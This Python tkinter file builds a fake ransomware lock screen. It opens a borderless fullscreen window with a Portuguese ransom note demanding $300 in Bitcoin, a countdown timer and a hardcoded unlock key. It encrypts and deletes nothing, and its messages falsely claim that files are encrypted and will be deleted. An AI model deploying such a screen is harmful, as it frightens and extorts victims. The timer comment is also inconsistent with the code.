import os
import threading
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk



class RansomwareApp:
    def __init__(self, root):
        self.root = root
        self.tentativas_restantes = 3
        self.senha_correta = "1234"
        self.tempo_inicial = 60 * 60 * 100  # 1 hora em milissegundos
        self.tempo_restante = self.tempo_inicial
        self.setup_ui()

    def setup_ui(self):
        """Configura a interface gráfica."""
        self.root.overrideredirect(True)
        self.root.title("RANSOWARE 2.1")
        
        largura = self.root.winfo_screenwidth()
        altura = self.root.winfo_screenheight()
        self.root.geometry(f"{largura}x{altura}")
        self.root.config(bg="blue")
        self.root.resizable(width=False, height=False)

        # Imagem de fundo
        self.setup_background(largura, altura)

        # Elementos da interface
        self.setup_title()
        self.setup_canvas(largura, altura)
        self.setup_payment_section()

        # Temporizador e alterações visuais
        self.label_tempo = tk.Label(self.root, text="60:00:00", font=("Helvetica", 48), bg="#132116", fg="white")
        self.label_tempo.pack(pady=450)
        self.start_timer()

    def setup_background(self, largura, altura):
        """Configura a imagem de fundo."""
        imagem_fundo_path = "imagens/matrix-background.jpg"
        imagem_fundo = Image.open(imagem_fundo_path)
        imagem_fundo = imagem_fundo.resize((largura, altura))
        imagem_fundo_tk = ImageTk.PhotoImage(imagem_fundo)

        label_fundo = tk.Label(self.root, image=imagem_fundo_tk)
        label_fundo.place(x=0, y=0, relwidth=1, relheight=1)
        label_fundo.image = imagem_fundo_tk

    def setup_title(self):
        """Adiciona título e ícone de alerta."""
        tk.Label(self.root, text="🔑", font=("Arial", 22), bg="red", fg="white").pack(pady=10)
        self.titulo_label = tk.Label(
            self.root, text="Oops, seus dados foram encrypted!!!",
            font=("Arial", 16, "bold"), fg="white", bg="red"
        )
        self.titulo_label.pack(pady=20)

    def setup_canvas(self, largura, altura):
        """Configura o canvas com o texto ameaçador."""
        canvas = tk.Canvas(self.root, width=950, height=550, bg="#011205")
        canvas.place(x=500, y=150)
        canvas.create_text(
            475, 200,
            text=(
                "ATENÇÃO! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n\n"
                "Todos os seus arquivos importantes, incluindo documentos, fotos, vídeos e outros dados, "
                "foram criptografados e estão inacessíveis. Para restaurar seus arquivos, "
                "você deve seguir as instruções abaixo:\n\n"
                "1. Não tente remover o ransomware ou restaurar seus arquivos por conta própria.\n"
                "2. Para restaurar seus arquivos, é necessário adquirir uma chave de descriptografia.\n"
                "3. O pagamento do resgate deve ser feito em Bitcoin (BTC).\n"
                "Envie $300 em bitcoin para o endereço:\n\n"
                "  CHAVE DE ENVIO\n\n"
                "IMPORTANTE: Se o pagamento não for feito em [1 HORA], seus arquivos serão permanentemente excluídos.\n\n"
                "TEMPO ESTÁ ACABANDO..."
            ),
            fill="white", font=('Arial', 15), width=950
        )

    def setup_payment_section(self):
        """Configura a seção de pagamento."""
        canvas_pagamento = tk.Canvas(self.root, width=850, height=150, bg="#010f01", highlightthickness=2, highlightbackground="white")
        canvas_pagamento.place(relx=0.5, rely=0.75, anchor="center")

        tk.Label(
            canvas_pagamento, text="Coloque a chave de liberação. Você tem 3 tentativas",
            font=("Arial", 12), bg="#010f01", fg="white"
        ).place(relx=0.5, rely=0.1, anchor="center")

        self.entrada_chave = tk.Entry(canvas_pagamento, width=30, font=("Arial", 12))
        self.entrada_chave.place(relx=0.5, rely=0.3, anchor="center")
        self.entrada_chave.bind("<Return>", lambda event: self.decrypt())

        tk.Button(
            canvas_pagamento, text="Check Payment", font=('Arial', 12),
            command=self.check_payment, width=15, height=2, bg="#072103", fg="white", relief="raised"
        ).place(relx=0.3, rely=0.7, anchor="center")

        tk.Button(
            canvas_pagamento, text="Decrypt", font=('Arial', 12),
            command=self.decrypt, width=15, height=2, bg="#072103", fg="white", relief="raised"
        ).place(relx=0.7, rely=0.7, anchor="center")

    def check_payment(self):
        """Exibe mensagem de verificação de pagamento."""
        messagebox.showinfo("Pagamento", "Verifique se o pagamento foi realizado corretamente.")

    def decrypt(self):
        """Verifica a chave de liberação e exibe mensagens apropriadas."""
        text = self.entrada_chave.get()
        if text == self.senha_correta:
            messagebox.showinfo("Liberado", "Senha correta!")
            self.root.destroy()
        else:
            self.tentativas_restantes -= 1
            if self.tentativas_restantes > 0:
                messagebox.showwarning("Incorreto", f"Código inválido! Tentativas restantes: {self.tentativas_restantes}")
                self.entrada_chave.delete(0, tk.END)
            else:
                messagebox.showerror("BLOQUEADO", "Número máximo de tentativas atingido... Excluindo arquivos")
                self.root.destroy()

 
    def start_timer(self):
        """Inicia o temporizador e altera a cor do título."""
        threading.Thread(target=self.temporizador, daemon=True).start()
        self.root.after(1000, self.alterar_cor_titulo)

    def temporizador(self):
        """Executa o temporizador."""
        if self.tempo_restante > 0:
            mins, secs = divmod(self.tempo_restante // 100, 60)
            millis = self.tempo_restante % 100
            timer = '{:02d}:{:02d}:{:02d}'.format(mins, secs, millis)
            self.label_tempo.config(text=timer)
            self.tempo_restante -= 1
            self.label_tempo.after(10, self.temporizador)
        else:
            self.titulo_label.config(text="Tempo esgotado")
            self.root.update()
            self.root.after(2000, self.root.destroy)


    def alterar_cor_titulo(self):
        """Altera a cor do título conforme o tempo restante."""
        if self.tempo_restante // 100 <= 30:
            self.titulo_label.config(fg="yellow")
        if self.tempo_restante // 100 <= 10:
            self.titulo_label.config(fg="red")
        if self.tempo_restante == 0:
            self.titulo_label.config(fg="black", text="SEUS ARQUIVOS FORAM EXCLUÍDOS!")


if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareApp(root)
    root.mainloop() 
